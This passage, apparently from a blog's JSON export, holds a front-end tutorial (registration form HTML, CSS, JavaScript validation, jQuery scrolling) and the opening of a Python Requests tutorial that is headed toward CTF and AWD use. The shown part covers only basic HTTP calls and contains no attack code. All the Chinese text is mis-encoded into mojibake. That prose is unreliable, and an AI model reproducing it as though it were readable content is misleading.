onChange=\"changeStatus(this)\"/><span class=\"star\"> *</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">æ€§åˆ«ï¼š</span>\n\t\t\t\t<div class=\"item-inp\"><label><input type=\"radio\" name=\"user_sex\" value=\"ç”·\"/><span>ç”·</span></label>\n\t\t\t\t<input type=\"radio\" id=\"user_sex\"  name=\"user_sex\" value=\"å¥³\" checked/><label for=\"user_sex\">å¥³</label>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">èº«é«˜ï¼š</span>\n\t\t\t\t<input type=\"number\" class=\"item-inp\" name=\"user_height\" min=\"150\" max=\"190\" value=\"175\" step=\"5\" /> å˜ç±³\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ä½“é‡ï¼š</span>\n\t\t\t\t<input type=\"range\" class=\"item-inp\" name=\"user_weight\" min=\"45\" max=\"90\" value=\"55\" step=\"2\" /> åƒå…‹\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å‡ºç”Ÿæ—¥æœŸï¼š</span>\n\t\t\t\t<input type=\"date\"  class=\"item-inp\" name=\"user_birthday\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ç”µè¯å·ç ï¼š</span>\n\t\t\t\t<input type=\"tel\" class=\"item-inp\" name=\"user_tel\" pattern=\"\\d{11}\" placeholder=\"è¯·è¾“å…¥11æ‰‹æœºå·ç \"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">E-mailï¼š</span>\n\t\t\t\t<input type=\"email\" class=\"item-inp\" name=\"user_email\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ä¸ªäººä¸»é¡µï¼š</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_homepage\" autocomplete=\"off\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å®¶åº­ä½å€ï¼š</span>\n\t\t\t\t<select class=\"item-inp\" name=\"user_address\" >\n\t\t\t\t\t<option value=\"0\" >åŒ—äº¬</option>\n\t\t\t\t\t<option value=\"1\" >ä¸Šæµ·</option>\n\t\t\t\t\t<option value=\"2\" selected>æˆéƒ½</option>\n\t\t\t\t</select>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">é‚®æ”¿ç¼–ç ï¼š</span>\n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_zipcode\" pattern=\"[0-9]{6}\" placeholder=\"è¯·è¾“å…¥6ä½é‚®æ”¿ç¼–ç \" />\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">æœ€çˆ±çš„é¢œè‰²ï¼š</span>\n\t\t\t\t\t<input type=\"color\" class=\"item-inp\" name=\"user_color\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å–œæ¬¢çš„è¿åŠ¨ï¼š</span>\n\t\t\t\t<input type=\"checkbox\" name=\"user_habit\" value=\"ç¯®çƒ\"/><span>ç¯®çƒ</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit\" value=\"è¶³çƒ\" checked><span>è¶³çƒ</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit\" value=\"æ¸¸æ³³\"><span>æ¸¸æ³³</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">å–œæ¬¢çš„ç½‘ç«™ï¼š</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_favurl\" list=\"urllist\"/>\n\t\t\t\t<datalist id=\"urllist\" >\n\t\t\t\t\t\t<option label=\"ç™¾åº¦\" value=\"http://www.baidu.com\"/>\n\t\t\t\t\t\t<option label=\"æ–°æµª\" value=\"http://www.sina.com\"/>\n\t\t\t\t\t\t<option label=\"è°·æ­Œ\" value=\"http://www.google.com\"/>\n\t\t\t\t\t\t<option value=\"http://www.163.com\">ç½‘æ˜“</option>\n\t\t\t\t</datalist>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ç”Ÿæ´»ç…§2å¼ ï¼š</span>\n\t\t\t\t<input type=\"file\" class=\"item-inp\" name=\"user_album\"  multiple/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">ä¸ªäººè‡ªè¿°ï¼š</span>\n\t\t\t\t\t<textarea name=\"info\" rows=\"5\" cols=\"50\">æˆ‘æ˜¯ä¸€ä½ç‰¹åˆ«çƒ­çˆ±å­¦ä¹ çš„å¥½å­©å­ã€‚ã€‚ã€‚</textarea>\n\t\t\t</div>\n\t\t\t\t\n\t\t\t\t<input type=\"hidden\" name=\"user_secret\" value=\"7\"/>\n\t\t\t\t\n\t\t\t<div class=\"info-item\" style=\"text-align:center;\">\n\t\t\t\t\t<input type=\"button\" class=\"item-bt\" value=\"æ³¨å†Œ\" onClick=\"validate()\" style=\"margin-right:100px;\"/>   <input type=\"reset\" class=\"item-bt\" value=\"é‡ç½®\" />\n\t\t\t</div>\n\t\t\t\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t\t\n\t\t\t\t<ul class=\"info-item\">\n\t\t\t\t\t\t<li><a href=\"tel:10086\">ç”µè¯</a></li>\n\t\t\t\t\t\t<li><a href=\"sms:10086\">çŸ­ä¿¡</a></li>\n\t\t\t\t\t\t<li><a href=\"mailto:10086@sina.com\">E-mail</a></li>\n\t\t\t\t\t\t<li><a href=\"#title\">è¿”å›é¡¶éƒ¨</a></li>\n\t\t\t\t</ul>\n\t</form>\n\t</div>\t\n</body>\n</html>\n```\n\n#### Register.css\n\n```css\n@charset \"utf-8\";\n*{\n\t\tfont-size:13px;\n\t}\na {\ntext-decoration: none;\n}\na:link {\n\tcolor: blue;\n}\na:visited {\n\tcolor: gray;\n}\na:hover {\n\tcolor: red;\n}\na:active {\n\tcolor: yellow;\n}\n#wrapper {\n\twidth: 95%;\n\tmin-width: 400px;\n\tmax-width: 700px;\n\tmargin: 10px auto;\n\tpadding-top:5px;\n\tborder: 1px solid #ccc;\n\tbackground-color: #eee;\n\tletter-spacing: 0.2em;\n}\n\n#title {\n\ttext-align: center;\n\tcolor: transparent;\n\tfont-size: 1.5em;\n\tfont-weight: bolder;\n\tmargin: 10px;\n\t/*border: 1px solid red;*//*è®¾ç½®è¾¹æ¡†ä¾¿äºå¸ƒå±€æµ‹è¯•*/\n\ttext-shadow: 0 0 rgba(0,0,255,0.7),  \n\t\t\t\t -0.1em -0.1em 0.2em rgba(255,0,0,0.5),  \n\t\t\t\t 0.1em 0.1em 0.2em rgba(0,255,0,0.5);\n}\n#title:target{/*è¿”å›é¡¶éƒ¨æ—¶æ”¹å˜titleå­—ä½“é¢œè‰²*/\n\tcolor:red;\n}\n\n.info-item{\n\tmargin: 10px;\n\tpadding: 3px;\n\t/*border: 1px solid green;*/\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\n.item-name {\n\twidth: 32%;\n\tdisplay: inline-block;\n\ttext-align: right;\n\tvertical-align: middle;/*æ–‡æœ¬å’Œè¾“å…¥åŸŸå‡è®¾ç½®å‚ç›´å±…ä¸­å¯¹é½*/\n}\n.item-inp{\n\twidth: 40%;\n\tbox-sizing:border-box;/*å¦åˆ™è®¾ç½®äº†èƒŒæ™¯å›¾åƒçš„è¾“å…¥åŸŸå› padding-leftè€Œå˜å®½*/\n\tdisplay: inline-block;\n\tvertical-align: middle;\n\tmargin-right:0.5em;\n}\n\n/*å¸¦æœ‰èƒŒæ™¯å›¾åƒçš„è¾“å…¥åŸŸæ ·å¼è®¾è®¡*/\n.info-item:nth-child(1) input{\n\tbackground: url(../image/name.gif) no-repeat;\n\tbackground-color: white;/*è®¾ç½®èƒŒæ™¯å›¾åƒåï¼Œé»˜è®¤çš„èƒŒæ™¯è‰²å°†ä¼šæ˜¯çˆ¶å…ƒç´ çš„èƒŒæ™¯è‰²ï¼ˆå¦‚æœå­˜åœ¨ï¼Œå¦åˆ™èƒŒæ™¯è‰²é€æ˜ï¼‰*/\n\tpadding-left: 20px;/*ä½¿å¾—contentè¾“å…¥åŒºåœ¨èƒŒæ™¯å›¾åƒå³è¾¹*/\n\tborder: 1px solid #ccc;/*å¦‚æœä¸é‡å®šä¹‰è¾¹æ¡†ï¼Œåˆ™ä¼šå› ä¸ºèƒŒæ™¯å›¾åƒçš„å½±å“è€Œå‡ºç°ç«‹ä½“è¾¹æ¡†*/\n\t\n}\n.info-item input[type=\"password\"] {\n\tbackground: url(../image/password.gif) no-repeat;\n\tbackground-color: white;\n\tpadding-left: 20px;\n\tborder: 1px solid #ccc;/*å¦‚æœä¸é‡å®šä¹‰è¾¹æ¡†ï¼Œåˆ™ä¼šå› ä¸ºèƒŒæ™¯å›¾åƒçš„å½±å“è€Œå‡ºç°ç«‹ä½“è¾¹æ¡†*/\n}\n\ninput:checked+span,input:checked+label {/*è®¾ç½®è¢«é€‰ä¸­çš„å•é€‰æŒ‰é’®å’Œå¤é€‰æ¡†åçš„æ–‡å­—çš„é¢œè‰²*/\n\tcolor: red;\n}\ntextarea{\n\twidth:60%;\n\tvertical-align:middle;\n}\n\n/*è®¾ç½®å¯¼èˆªé“¾æ¥çš„æ ·å¼*/\n\nul, li {\n\tbox-sizing: border-box;\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\nul {\n\tlist-style: none;\n\ttext-align:center;\n}\nli {\n\twidth: 22%;\n\tdisplay:inline-block;\n}\nli:nth-child(odd):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) rotate(-15deg);\n}\nli:nth-child(even):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) skew(30deg);\n}\n\n.star{color:#F00;}\n```\n\n#### Register.js\n\n```javascript\nfunction changeStatus(obj){\n    //æ–¹æ³•ä¸€ï¼šé€šè¿‡èŠ‚ç‚¹å…³ç³»\n    /*if(obj.value!=null&&obj.value.trim()!=\"\")//ä¸å…¨ä¸ºç©ºæ ¼æ—¶\n\t\t\t\tobj.nextSibling.style.color=\"#333\";\n\t\t\telse\n\t\t\t\tobj.nextSibling.style.color=\"#F00\";*/\n\n    //æ–¹æ³•äºŒï¼šé€šè¿‡èŠ‚ç‚¹åˆ—è¡¨åŠä¸¤ç±»èŠ‚ç‚¹çš„å¯¹åº”å…³ç³»\n    var objs = document.getElementsByClassName(\"item-inp\");\n    var stars = document.querySelectorAll(\".star\");\n    for(var i=0;i<4;i++){\n        obj = objs[i];\n        if(obj.value!=null&&obj.value.trim()!=\"\")\n            stars[i].style.color=\"#333\";\n        else\n            stars[i].style.color=\"#F00\";\n    }\n}\nfunction validate(){\n    var allinfos = \"\";\n\n    var user_name=document.forms[0].user_name.value.trim();//\n    allinfos+=\"å§“åï¼š\"+user_name+\"\\n\";//åŠ æ¢è¡Œ\n    var user_id=document.forms[0].user_id.value.trim();//\n    allinfos+=\"å­¦å·ï¼š\"+user_id+\"\\n\";//åŠ æ¢è¡Œ\n    var user_sex = document.regForm.user_sex.value.trim();\n    allinfos+=\"æ€§åˆ«ï¼š\"+user_sex+\"\\n\";//åŠ æ¢è¡Œ\n    var user_address = document.regForm.user_address;\n    allinfos+=\"ä½å€ï¼š\"+user_address.options[user_address.selectedIndex].innerText+\"\\n\";\n    var user_habit = document.regForm.user_habit;\n    allinfos+=\"çˆ±å¥½ï¼š\";\n    for (var i = 0; i < user_habit.length; i++) {\n        if (user_habit[i].checked) {\n            allinfos+=user_habit[i].value+ \"ã€\";\n        }\n    }\n    allinfos = allinfos.substring(0,allinfos.length-1);//åˆ é™¤æœ€åä¸€ä¸ªç©ºæ ¼å­—ç¬¦\n    //document.regForm.info.value = allinfos;\n    var resp = window.confirm(allinfos+\"\\n\\nè¯·æ ¸å¯¹ä»¥ä¸Šä¿¡æ¯æ˜¯å¦æ­£ç¡®ï¼Ÿ\\n\\nå•å‡»'ç¡®å®š'ç»§ç»­ï¼Œå¦åˆ™å–æ¶ˆ\");\n\n    if(resp==false) return;\n\n\n    var user_pwd1=document.forms[0].user_pwd1.value.trim();\n    var user_pwd2=document.forms[0].user_pwd2.value.trim();\n    var user_tel=document.forms[0].user_tel.value.trim();\n    var user_email=document.forms[0].user_email.value.trim();\n\n    document.forms[0].user_name.value = user_name;//å‘æœåŠ¡å™¨æäº¤å»æ‰ç©ºæ ¼åçš„ç”¨æˆ·å\n\n    if(user_name.length<=0)\n        alert(\"ç”¨æˆ·åä¸èƒ½ä¸ºç©ºï¼\");  \n    else if(user_pwd1.length<8)\n        alert(\"å¯†ç é•¿åº¦å¿…é¡»ä¸º8ä½ï¼\");  \n    else if(user_pwd2==\"\")\n        alert(\"è¯·è¾“å…¥ç¡®è®¤å¯†ç ï¼\");\n    else if(user_pwd1!=user_pwd2)\n        alert(\"ä¸¤æ¬¡å¯†ç ä¸ä¸€è‡´ï¼\"); \n    else  if(user_tel.length!=11)\n        alert(\"æ‰‹æœºå·å¿…é¡»ä¸º11ä½ï¼\");\n    else  if(!checkNum(user_tel))\n        alert(\"æ‰‹æœºå·å¿…é¡»ä¸ºæ•°å­—ï¼\");\n    else if(user_email.indexOf(\"@\")<1||user_email.indexOf(\"@\")==user_email.length-1||user_email.indexOf(\"@\")!=user_email.lastIndexOf(\"@\"))\n        alert(\"é‚®ä»¶æ ¼å¼ä¸æ­£ç¡®ï¼\");\n    else  \n        document.forms[0].submit(); \n}\n\nfunction checkNum(num){//æ£€æµ‹ç”µè¯å·ç çš„æ¯ä¸€ä½æ˜¯å¦æ˜¯æ•°å­—å­—ç¬¦ï¼Œæ–¹æ³•ä¸€\n    var isNum = true;\n    for(i=0;i<num.length;i++)\n    {\n        if(isNaN(num.charAt(i)))\n        {\n            isNum = false;\n            break;\n        }\n    }\n    return isNum;\n}\n\t\t\nfunction checkNum2(num){//æ£€æµ‹ç”µè¯å·ç çš„æ¯ä¸€ä½æ˜¯å¦æ˜¯æ•°å­—å­—ç¬¦ï¼Œæ–¹æ³•äºŒ\n    var isNum = false;\n    for(i=0;i<num.length;i++)\n    {\n        if(num.charAt(i)-'0' >=0 && num.charAt(i)-'0' <=9)\n        {\n            isNum = true;\n        }\n        else\n            isNum = false;\n    }\n    return isNum;\n}\n```\n\n## ä¸€äº›å®ç”¨ä¾‹å­\n\n### é€æ˜æ•ˆæœ\n\n```css\nstyle=\"background-color:rgba(0,0,0,0);\"\n```\n\n### é¡µé¢æ»šåŠ¨åˆ°æŒ‡å®šä½ç½®\n\n```html\n<!DOCTYPE html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>jså¹³æ»‘æ»šåŠ¨åˆ°é¡¶éƒ¨ã€åº•éƒ¨ã€æŒ‡å®šåœ°æ–¹</title>\n<script type=\"text/javascript\" src=\"http://cdn.staticfile.org/jquery/2.1.1-rc2/jquery.min.js\"></script>\n<style>\n .box{ height:200px; width:100%; background:#ccc; margin:10px 0;}\n .location{ position:fixed; right:0; bottom:10px; width:20px; background:#FFC; padding:5px; cursor:pointer;color:#003};\n</style>\n</head>\n<body>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box a\">äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»äº§å“ä»‹ç»</div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box\"></div>\n<div class=\"box bottom\"></div>\n<div class=\"location\">\n  <p class=\"scroll_top\">è¿”å›é¡¶éƒ¨</p>\n  <p class=\"scroll_a\">äº§å“ä»‹ç»</p>\n  <p class=\"scroll_bottom\">æ»‘åˆ°åº•éƒ¨</p>\n</div>\n<script type=\"text/javascript\">\n jQuery(document).ready(function($){\n  $('.scroll_top').click(function(){$('html,body').animate({scrollTop: '0px'}, 800);}); \n  $('.scroll_a').click(function(){$('html,body').animate({scrollTop:$('.a').offset().top}, 800);});\n  $('.scroll_bottom').click(function(){$('html,body').animate({scrollTop:$('.bottom').offset().top}, 800);});\n });\n</script>\n</body>\n</html>\n```\n\n","tags":["Web"],"categories":["JavaWeb"]},{"title":"Pythonæ¨¡å—-Requestså­¦ä¹ ä¸CTFå’ŒAWDå®æˆ˜","url":"/posts/57181.html","content":"![](https://img.jwt1399.top//img/20200824173112.png)\n\n>Requests is the only Non-GMO HTTP library for Python, safe for human consumption.\n\n## å‰è¨€\n\nä¸ºä»€ä¹ˆå­¦ä¹ `Requests`æ¨¡å—å‘¢ï¼Œå› ä¸ºæœ€è¿‘è€æ˜¯é‡è§å®ƒï¼Œè‡ªå·±åˆä¸å¤ªæ‡‚ï¼ŒåŠ ä¹‹åœ¨å¾ˆå¤š`Web`çš„`poc`é‡Œé¢`Requests`æ¨¡å—çš„å‡ºé•œç‡å¾ˆé«˜ï¼Œäºæ˜¯ç‰¹æ­¤å­¦ä¹ è®°å½•ä¹‹ã€‚\n\n## ç®€ä»‹\n`Requests`æ˜¯ä¸€ä¸ªç®€å•æ–¹ä¾¿çš„`HTTP åº“`ã€‚æ¯”`Python`æ ‡å‡†åº“ä¸­çš„`urllib2`æ¨¡å—åŠŸèƒ½å¼ºå¤§ã€‚Requests ä½¿ç”¨çš„æ˜¯ urllib3ï¼Œå› æ­¤ç»§æ‰¿äº†å®ƒçš„æ‰€æœ‰ç‰¹æ€§ã€‚Requests æ”¯æŒä½¿ç”¨`cookie` ä¿æŒä¼šè¯ï¼Œæ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œæ”¯æŒè‡ªåŠ¨ç¡®å®šå“åº”å†…å®¹çš„ç¼–ç ï¼Œæ”¯æŒ`URL` å’Œ `POST` æ•°æ®è‡ªåŠ¨ç¼–ç ã€‚å¸®åŠ©æˆ‘ä»¬è½»æ¾è§£å†³å…³äº`HTTP`çš„å¤§éƒ¨åˆ†é—®é¢˜ã€‚\n\n## å®‰è£…\n**æ–¹æ³•ä¸€**ï¼š\nåªè¦åœ¨ä½ çš„ç»ˆç«¯ä¸­è¿è¡Œè¿™ä¸ªç®€å•å‘½ä»¤å³å¯ï¼š\n\n```\n$ pip install requests\n```\nå¦‚æœä½ æ²¡æœ‰å®‰è£…`Python`ï¼Œè¿™ä¸ª [Python installation guide](https://docs.python-guide.org/starting/installation/) å¯ä»¥å¸¦ä½ å®Œæˆè¿™ä¸€æµç¨‹ã€‚\n\n**æ–¹æ³•äºŒ**\nä½ å¯ä»¥å…‹éš†å…¬å…±ç‰ˆæœ¬åº“ï¼š\n```\ngit clone git://github.com/kennethreitz/requests.git\n```\nè·å¾—ä»£ç ä¹‹åï¼Œä½ å°±å¯ä»¥è½»æ¾çš„å°†å®ƒåµŒå…¥åˆ°ä½ çš„ python åŒ…é‡Œ\n```\ncd requests\npython setup.py install\n```\næˆ–è€…æ”¾åˆ°ä½ çš„`Python27\\Lib\\site-packages`ç›®å½•ä¸‹\n\nèƒ½å¯¼å…¥requestsï¼Œå³å®‰è£…æˆåŠŸ\n```python\n>>> import requests\n```\n## Requestså¸¸ç”¨æ–¹æ³•\næ‰€æœ‰ç¤ºä¾‹éƒ½æ˜¯ä»¥Githubå®˜ç½‘ï¼ˆhttps://github.com/ï¼‰ä¸ºä¾‹\n### å‘é€è¯·æ±‚\nå‘èµ·`GET`è¯·æ±‚;\n```python\n>>> r = requests.get('https://github.com/')\n```\nå‘èµ·`POST`è¯·æ±‚ï¼š\n```python\n>>> r = requests.post('https://github.com/post', data = {'key':'value'})\n```\nå…¶ä»–` HTTP` è¯·æ±‚ç±»å‹ï¼š`PUTï¼ŒDELETEï¼ŒHEAD ä»¥åŠ OPTIONS`,éƒ½æ˜¯ä¸€æ ·çš„ç®€å•\n```python\n>>> r = requests.put('https://github.com/', data = {'key':'value'})\n>>> r = requests.delete('https://github.com/delete')\n>>> r = requests.head('https://github.com//get')\n>>> r = requests.options('https://github.com/get')\n```\nç°åœ¨ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º` r `çš„` Response `å¯¹è±¡ã€‚æˆ‘ä»¬å¯ä»¥ä»è¿™ä¸ªå¯¹è±¡ä¸­è·å–æ‰€æœ‰æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚\n### æŸ¥çœ‹è¯·æ±‚å¤´\nä»¥æŸ¥çœ‹`GET`è¯·æ±‚çš„è¯·æ±‚å¤´ä¸ºä¾‹ï¼Œ`POST`è¯·æ±‚åŒç†ï¼š\n```python\n>>> r = requests.get('https://github.com/')\n>>> r.request.headers\n{'Connection': 'keep-alive', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'User-Agent': 'python-requests/2.22.0'}\n```\næŸ¥çœ‹è¯·æ±‚å¤´çš„æŸä¸€å±æ€§ï¼š(å¤§å°å†™ä¸å½±å“)\n```python\n>>> r.request.headers['Accept-Encoding']\n'gzip, deflate'\n>>> r.request.headers.get('user-agent')\n'python-requests/2.22.0'\n```\n### æŸ¥çœ‹å“åº”å¤´\næŸ¥çœ‹GETè¯·æ±‚çš„å“åº”å¤´ä¸ºä¾‹ï¼ŒPOSTè¯·æ±‚åŒç†ï¼š\n```python\n>>> r = requests.get('https://github.com/')\n>>> r.headers\n{'Status': '200 OK', 'Expect-CT': 'max-age=2592000, report-uri=\"https://api.github.com/_private/browser/errors\"', 'X-Request-Id': '45a5c520-bb73-4677-b30c-19300dcf6f38', 'X-XSS-Protection': '1; mode=block', 'Content-Security-Policy': \"default-src 'none'; base-uri 'self'; block-all-mixed-content; ......}\n```\næŸ¥çœ‹å“åº”å¤´çš„æŸä¸€å±æ€§ï¼š(å¤§å°å†™ä¸å½±å“)\n```python\n>>> r.headers['Status']\n'200 OK'\n>>>r.headers.get('content-type')\n'text/html; charset=utf-8'\n```\n### æŸ¥çœ‹å“åº”å†…å®¹\næŸ¥çœ‹æœåŠ¡å™¨è¿”å›é¡µé¢çš„å†…å®¹ï¼Œä»¥æŸ¥çœ‹GETè¯·æ±‚çš„å“åº”å†…å®¹ä¸ºä¾‹ï¼ŒPOSTè¯·æ±‚åŒç†ï¼š\n```python\n>>> r = requests.get('https://github.com/')\n>>> r.text\nu'\\n\\n\\n\\n\\n\\n<!DOCTYPE html>\\n<html lang=\"en\">\\n  <head>\\n    <meta charset=\"utf-8\">\\n...\n```\n`Requests` ä¼šè‡ªåŠ¨è§£ç æ¥è‡ªæœåŠ¡å™¨çš„å†…å®¹ã€‚å¤§å¤šæ•° `unicode` å­—ç¬¦é›†éƒ½èƒ½è¢«æ— ç¼åœ°è§£ç ã€‚\n\nè¯·æ±‚å‘å‡ºåï¼Œ`Requests` ä¼šåŸºäº `HTTP` å¤´éƒ¨å¯¹å“åº”çš„ç¼–ç ä½œå‡ºæœ‰æ ¹æ®çš„æ¨æµ‹ã€‚å½“ä½ è®¿é—® `r.text` ä¹‹æ—¶ï¼Œ`Requests` ä¼šä½¿ç”¨å…¶æ¨æµ‹çš„æ–‡æœ¬ç¼–ç ã€‚ä½ å¯ä»¥æ‰¾å‡º `Requests` ä½¿ç”¨äº†ä»€ä¹ˆç¼–ç ï¼Œå¹¶ä¸”èƒ½å¤Ÿä½¿ç”¨`r.encoding` å±æ€§æ¥æ”¹å˜å®ƒï¼š\n```python\n>>> r.encoding\n'utf-8'\n>>> r.encoding = 'ISO-8859-1'\n```\n### äºŒè¿›åˆ¶å“åº”å†…å®¹\nä½ ä¹Ÿèƒ½ä»¥å­—èŠ‚çš„æ–¹å¼è®¿é—®è¯·æ±‚å“åº”ä½“ï¼Œå¯¹äºéæ–‡æœ¬è¯·æ±‚ï¼š\n```python\n>>> r.content\nb'[{\"repository\":{\"open_issues\":0,\"url\":\"https://github.com/...\n```\nRequests ä¼šè‡ªåŠ¨ä¸ºä½ è§£ç  gzip å’Œ deflate ä¼ è¾“ç¼–ç çš„å“åº”æ•°æ®ã€‚\n\nä¾‹å¦‚ï¼Œä»¥è¯·æ±‚è¿”å›çš„äºŒè¿›åˆ¶æ•°æ®åˆ›å»ºä¸€å¼ å›¾ç‰‡ï¼Œä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç ï¼š\n```python\n>>> from PIL import Image\n>>> from io import BytesIO\n>>> i = Image.open(BytesIO(r.content))\n```\n### ä¼ é€’GETè¯·æ±‚å‚æ•°\nGETè¯·æ±‚å‚æ•°ä½œä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²é™„åŠ åœ¨URLæœ«å°¾ï¼Œå¯ä»¥é€šè¿‡`requests.get()`æ–¹æ³•ä¸­çš„`params`å‚æ•°(`dict`ç±»å‹å˜é‡)å®Œæˆã€‚ä¾‹å¦‚ï¼Œæˆ‘è¦æ„å»ºçš„URLä¸º`https://github.com/?username=jwt&id=1`ï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç ä¼ é€’`GET`è¯·æ±‚å‚æ•°ï¼š\n```python\n>>> args = {'username': 'jwt', 'id': 1}\n>>> r = requests.get('https://github.com/', params = args)\n>>> print(r.url)\nhttps://github.com/?username=jwt&id=1\n```\n### ä¼ é€’POSTè¯·æ±‚å‚æ•°\n\n`POST`è¯·æ±‚å‚æ•°ä»¥è¡¨å•æ•°æ®çš„å½¢å¼ä¼ é€’ï¼Œå¯ä»¥é€šè¿‡`requests.post()`æ–¹æ³•ä¸­çš„`data`å‚æ•°(dictç±»å‹å˜é‡)æˆ–è€…`json`å‚æ•°å®Œæˆï¼Œç”±äºgithubå®˜ç½‘POSTè¯·æ±‚å‚æ•°ä¸ä»¥æ˜æ–‡å±•ç°ï¼Œæ­¤å¤„æ”¹ä¸ºäº†å…¶ä»–ç½‘ç«™æµ‹è¯•\n\n#### ä½¿ç”¨dataå‚æ•°\n\nå…·ä½“ä»£ç å¦‚ä¸‹ï¼š\n\n```python\n>>> args = {'username': 'jwt', 'id': 1}\n>>> r = requests.post(\"http://httpbin.org/post\", data=args)\n>>> print(r.text)\n{\n  \"args\": {},\n  \"data\": \"\",\n  \"files\": {},\n  \"form\": {\n    \"id\": \"1\",\n    \"username\": \"jwt\"\n  },\n  \"headers\": {\n    \"Accept\": \"*/*\",\n    \"Accept-Encoding\": \"gzip, deflate\",\n    \"Content-Length\": \"17\",\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n    \"Host\": \"httpbin.org\",\n    \"User-Agent\": \"python-requests/2.22.0\"\n  },\n  \"json\": null,\n  \"origin\": \"3.112.219.149, 3.112.219.149\",\n  \"url\": \"https://httpbin.org/post\"\n    \n```\n#### ä½¿ç”¨jsonå‚æ•°\n\nè¿™é‡Œå°±è®°å½•ä¸€ä¸‹å¦‚ä½•ç”¨requestså‘é€jsonæ ¼å¼çš„æ•°æ®ï¼Œå› ä¸ºä¸€èˆ¬æˆ‘ä»¬postå‚æ•°ï¼Œéƒ½æ˜¯ç›´æ¥postï¼Œæ²¡ç®¡postçš„æ•°æ®çš„ç±»å‹ï¼Œæ­¤æ—¶å…¶é»˜è®¤ç±»å‹ä¸ºï¼š\n\n```\napplication/x-www-form-urlencoded\n```\n\nä½†æ˜¯ï¼Œæˆ‘ä»¬å†™ç¨‹åºçš„æ—¶å€™ï¼Œæœ€å¸¸ç”¨çš„æ¥å£postæ•°æ®çš„æ ¼å¼æ˜¯jsonæ ¼å¼ã€‚å½“æˆ‘ä»¬éœ€è¦post jsonæ ¼å¼æ•°æ®çš„æ—¶å€™ï¼Œæ€ä¹ˆåŠå‘¢ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\n##### 1ï¼Œåœ¨headerä¸­æŒ‡å®šæ•°æ®ç±»å‹\n\nè¯¦è§å¦‚ä¸‹ä»£ç :\n\n```python\nimport requests\nimport json\n \ndata = {\n    'a': 123,\n    'b': 456\n}\n \n## headersä¸­æ·»åŠ ä¸Šcontent-typeè¿™ä¸ªå‚æ•°ï¼ŒæŒ‡å®šä¸ºjsonæ ¼å¼\nheaders = {'Content-Type': 'application/json'}\n \n## postçš„æ—¶å€™ï¼Œå°†dataå­—å…¸å½¢å¼çš„å‚æ•°ç”¨jsonåŒ…è½¬æ¢æˆjsonæ ¼å¼ã€‚\nresponse = requests.post(url='url', headers=headers, data=json.dumps(data))\n```\n\n##### 2ï¼Œç›´æ¥ä½¿ç”¨jsonå‚æ•°\n\nç°åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„requestsçš„postæ–¹æ³•ï¼Œå·²ç»é»˜è®¤æä¾›ä¸€ä¸ªjsonçš„å‚æ•°ï¼Œç›´æ¥ä¼ å…¥å­—å…¸æ•°æ®ï¼Œè‡ªåŠ¨å®Œæˆä»¥ä¸Šçš„ä¼ è¯ï¼Œä½¿ç”¨jsonæ ¼å¼ä¼ è¾“æ•°æ®ã€‚\n\nä»£ç å¦‚ä¸‹ï¼š\n\n```python\nimport requests\n \ndata = {\n    'a': 123,\n    'b': 456\n}\n \n## postçš„æ—¶å€™ï¼Œä½¿ç”¨jsonå‚æ•°\nresponse = requests.post(url='url', json=data)\n```\n\nå°±å¯ä»¥å‘é€jsonæ ¼å¼æ•°æ®äº†ã€‚\n\nå‚è€ƒï¼š[python ä½¿ç”¨requestså‘é€jsonæ 